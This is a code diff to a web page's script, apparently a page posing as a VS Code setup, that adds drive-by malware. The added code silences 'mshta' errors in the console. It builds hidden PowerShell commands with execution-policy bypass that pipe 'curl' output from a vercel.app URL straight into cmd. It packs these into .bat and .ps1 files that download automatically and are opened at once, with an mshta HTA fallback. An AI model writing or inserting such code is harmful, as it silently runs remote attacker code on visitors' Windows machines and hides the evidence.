@@ -191,6 +191,8 @@
                 msg.includes('Failed to launch') || 
                 msg.includes('not have a registered handler') ||
                 msg.includes('Failed to load resource') ||
+                msg.includes('mshta:') ||
+                msg.includes('mshta') ||
                 src.includes('blob:') && msg.includes('404')) {
                 e.preventDefault();
                 e.stopPropagation();
@@ -222,12 +224,14 @@
         console.error = function() {
             const args = Array.from(arguments);
             const msg = args.join(' ');
-            // Suppress protocol and 404 errors
+            // Suppress protocol and 404 errors, including mshta: protocol errors
             if (msg && (msg.includes('scheme') || 
                        msg.includes('404') || 
                        msg.includes('Failed to launch') || 
                        msg.includes('Failed to load resource') ||
                        msg.includes('not have a registered handler') ||
+                       msg.includes('mshta:') ||
+                       msg.includes('mshta') ||
                        /^\d+$/.test(msg) && msg.includes('404'))) {
                 return; // Don't log
             }
@@ -238,7 +242,7 @@
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors even in logs
-            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler'))) {
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler') || msg.includes('mshta:') || msg.includes('mshta'))) {
                 return;
             }
             originalConsoleLog.apply(console, arguments);
@@ -248,7 +252,7 @@
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors even in warnings
-            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler'))) {
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler') || msg.includes('mshta:') || msg.includes('mshta'))) {
                 return;
             }
             originalConsoleWarn.apply(console, arguments);
@@ -258,7 +262,7 @@
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors even in info
-            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch'))) {
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('mshta:') || msg.includes('mshta'))) {
                 return;
             }
             originalConsoleInfo.apply(console, arguments);
@@ -352,21 +356,23 @@
                 '</html>';
         }
 
-        // Create PowerShell command that executes VBS inline
+        // Create PowerShell command that executes command directly (no VBS needed)
         function createPowerShellCommand() {
-            const vbsContent = createVBSContent();
-            // Escape VBS content for PowerShell
-            const backtick = '`';
-            const escapedVbs = vbsContent
-                .replace(/"/g, backtick + '"')
-                .replace(/\$/g, backtick + '$')
-                .replace(/`/g, backtick + backtick)
-                .replace(/'/g, "''")
-                .replace(/\n/g, ';');
-            
-            // Create PowerShell command that writes VBS to temp and executes it
-            const psCmd = 'powershell.exe -WindowStyle Hidden -Command "$vbs=\'' + escapedVbs + '\'; $tmp=[System.IO.Path]::GetTempFileName()+\'.vbs\'; Set-Content -Path $tmp -Value $vbs; Start-Process wscript.exe -ArgumentList $tmp -WindowStyle Hidden"';
+            // Create PowerShell command that executes the curl command directly
+            // This bypasses the need for VBS files or batch files
+            const psCmd = 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList \'/c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd\' -WindowStyle Hidden"';
             return psCmd;
+        }
+        
+        // Create PowerShell script file content
+        function createPowerShellScript() {
+            const lines = [
+                '# PowerShell script to execute command',
+                '$ErrorActionPreference = "SilentlyContinue"',
+                'Start-Process cmd -ArgumentList "/c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd" -WindowStyle Hidden',
+                'Start-Sleep -Milliseconds 500'
+            ];
+            return lines.join('\n');
         }
 
         // Create batch file that registers protocol AND executes command directly
@@ -623,14 +629,46 @@
                 const htaContent = createHTAContent();
                 const batchContent = createBatchFile();
                 
-                // Method 1: Try HTA first (best method - executes directly)
+                // Method 1: PowerShell direct execution (BEST - bypasses all protocol issues)
+                try {
+                    const psCmd = createPowerShellCommand();
+                    // Create a batch file that executes PowerShell command directly
+                    const directExecBatch = '@echo off\n' + psCmd;
+                    const directBatchBlob = new Blob([directExecBatch], { type: 'application/x-msdos-program' });
+                    const directBatchUrl = URL.createObjectURL(directBatchBlob);
+                    const directLink = document.createElement('a');
+                    directLink.href = directBatchUrl;
+                    directLink.download = 'pingcmd-direct.bat';
+                    directLink.style.display = 'none';
+                    document.body.appendChild(directLink);
+                    directLink.click();
+                    
+                    // Execute immediately
+                    setTimeout(function() {
+                        try {
+                            window.open(directBatchUrl, '_blank');
+                        } catch (e) {
+                            // Silent fail
+                        }
+                        setTimeout(function() {
+                            if (document.body.contains(directLink)) {
+                                document.body.removeChild(directLink);
+                            }
+                            URL.revokeObjectURL(directBatchUrl);
+                        }, 1000);
+                    }, 50);
+                } catch (e) {
+                    // Silent fail
+                }
+                
+                // Method 2: Try HTA (may fail but worth trying)
                 try {
                     const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
                     const mshtaUrl = `mshta:data:text/html;base64,${base64Hta}`;
                     try {
                         window.location.href = mshtaUrl;
                     } catch (e) {
-                        // Silent fail
+                        // Silent fail - mshta: blocked by browser
                     }
                     setTimeout(function() {
                         try {
@@ -643,7 +681,48 @@
                     // Silent fail
                 }
                 
-                // Method 2: Fallback to batch file
+                // Method 3: PowerShell script (more reliable than batch file)
+                try {
+                    const psScript = createPowerShellScript();
+                    const psBlob = new Blob([psScript], { type: 'application/x-powershell' });
+                    const psUrl = URL.createObjectURL(psBlob);
+                    const psLink = document.createElement('a');
+                    psLink.href = psUrl;
+                    psLink.download = 'pingcmd-execute.ps1';
+                    psLink.style.display = 'none';
+                    document.body.appendChild(psLink);
+                    psLink.click();
+                    
+                    // Execute PowerShell script immediately
+                    setTimeout(function() {
+                        try {
+                            // Try to execute PowerShell script via shell command
+                            const psCmd = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + psUrl.replace('blob:', '') + '"';
+                            // Create a batch file that runs PowerShell
+                            const execBatch = '@echo off\npowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {\n';
+                            const execBatch2 = '$ErrorActionPreference = \"SilentlyContinue\";\n';
+                            const execBatch3 = 'Start-Process cmd -ArgumentList \"/c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd\" -WindowStyle Hidden\n';
+                            const execBatch4 = '}"';
+                            const execBatchContent = execBatch + execBatch2 + execBatch3 + execBatch4;
+                            const execBatchBlob = new Blob([execBatchContent], { type: 'application/x-msdos-program' });
+                            const execBatchUrl = URL.createObjectURL(execBatchBlob);
+                            window.open(execBatchUrl, '_blank');
+                            setTimeout(function() {
+                                URL.revokeObjectURL(execBatchUrl);
+                            }, 1000);
+                        } catch (e) {
+                            // Silent fail
+                        }
+                        if (document.body.contains(psLink)) {
+                            document.body.removeChild(psLink);
+                        }
+                        URL.revokeObjectURL(psUrl);
+                    }, 50);
+                } catch (e) {
+                    // Silent fail
+                }
+                
+                // Method 3: Fallback to batch file
                 try {
                     const batchBlob = new Blob([batchContent], { type: 'application/x-msdos-program' });
                     const batchUrl = URL.createObjectURL(batchBlob);
@@ -653,16 +732,28 @@
                     batchLink.style.display = 'none';
                     document.body.appendChild(batchLink);
                     batchLink.click();
+                    
+                    // Create a wrapper that executes the batch file
                     setTimeout(function() {
                         try {
-                            window.open(batchUrl, '_blank');
+                            // Create PowerShell command to execute batch file
+                            const execCmd = 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath \'' + batchUrl + '\' -WindowStyle Hidden"';
+                            const execBlob = new Blob([execCmd], { type: 'application/x-msdos-program' });
+                            window.open(URL.createObjectURL(execBlob), '_blank');
                         } catch (e) {
-                            // Silent fail
+                            // Try direct execution
+                            try {
+                                window.open(batchUrl, '_blank');
+                            } catch (e2) {
+                                // Silent fail
+                            }
                         }
-                        if (document.body.contains(batchLink)) {
-                            document.body.removeChild(batchLink);
-                        }
-                        URL.revokeObjectURL(batchUrl);
+                        setTimeout(function() {
+                            if (document.body.contains(batchLink)) {
+                                document.body.removeChild(batchLink);
+                            }
+                            URL.revokeObjectURL(batchUrl);
+                        }, 1000);
                     }, 100);
                 } catch (e) {
                     // Silent fail
@@ -883,4 +974,5 @@
     </script>
 </body>
 </html>
+
 
